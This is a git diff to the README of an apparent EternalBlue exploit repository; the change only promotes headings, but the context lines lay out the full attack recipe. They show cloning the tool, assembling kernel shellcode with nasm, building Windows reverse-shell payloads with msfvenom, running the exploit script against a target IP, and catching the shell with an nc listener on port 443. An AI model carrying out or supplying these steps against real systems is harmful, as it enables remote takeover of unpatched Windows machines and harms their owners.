@@ -8,7 +8,7 @@
 git clone https://github.com/Gabriel-Lima232/EternalBlue-in-Python3.git
 ```
 
-### Compiling the shellcode(s)
+## Compiling the shellcode(s)
 
 ### x64
 
@@ -22,7 +22,7 @@ nasm -f bin shellcode/eternalblue_x64.asm -o ./sc_x64_kernel.bin
 nasm -f bin shellcode/eternalblue_x86.asm -o ./sc_x86_kernel.bin
 ```
 
-### Create a Bin
+## Create a Bin
 
 ### x64
 
@@ -36,13 +36,13 @@ msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 LHOST=127.0.0.1 --platform w
 msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=127.0.0.1 --platform windows -a x86 --format raw -o sc_x86_payload.bin
 ```
 
-### Exploit
+## Exploit
 
 ```
 python3 eternal-blue.py TARGET-IP final.bin
 ```
 
-Open NC and wait the connection
+### Open NC and wait the connection
 
 ```
 $ nc -lvnp 443
